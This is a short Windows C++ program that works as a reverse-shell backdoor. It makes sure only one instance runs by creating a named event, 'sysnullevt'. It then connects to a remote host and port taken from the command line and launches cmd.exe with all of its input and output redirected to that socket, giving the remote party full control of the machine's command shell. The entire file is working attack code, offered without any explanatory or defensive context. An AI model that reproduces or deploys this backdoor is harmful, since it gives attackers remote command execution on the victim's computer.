// bd.cpp : Defines the entry point for the console application.
//

#include <winsock2.h>
#include <stdio.h>   

#pragma comment(lib,"ws2_32")

  WSADATA wsaData;
  SOCKET Winsock; 
  SOCKET Sock;    
  struct sockaddr_in hax;
                         
  STARTUPINFO ini_processo;
  PROCESS_INFORMATION processo_info;

int main(int argc, char *argv[])
{              
LPCSTR szMyUniqueNamedEvent="sysnullevt";
HANDLE m_hEvent = CreateEventA(NULL, TRUE, FALSE, szMyUniqueNamedEvent);

switch (GetLastError())
{
    // app is already running
    case ERROR_ALREADY_EXISTS:
    {
        CloseHandle(m_hEvent);
		return 0;
        // now exit
        break;
    }

    // this is the first instance of the app
    case ERROR_SUCCESS:
    {
        // global event created and new instance of app is running,
        // continue on, don't forget to clean up m_hEvent on exit
        break;
    }
}


    WSAStartup(MAKEWORD(2,2), &wsaData);
    Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);
                                                                                                  
    if (argc != 3){fprintf(stderr, "Usage: <rhost> <rport>\n"); exit(1);}                           
                                                                                                  
    hax.sin_family = AF_INET;                                                                     
    hax.sin_port =  htons(atoi(argv[2]));                                                         
    hax.sin_addr.s_addr = inet_addr(argv[1]);                                                     

    WSAConnect(Winsock,(SOCKADDR*)&hax,sizeof(hax),NULL,NULL,NULL,NULL);

    memset(&ini_processo,0,sizeof(ini_processo));
    ini_processo.cb=sizeof(ini_processo);        
    ini_processo.dwFlags=STARTF_USESTDHANDLES;   
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
                                                                                                
    CreateProcessA(NULL,"cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,(LPSTARTUPINFOA)&ini_processo,&processo_info);      
	return 0;
}

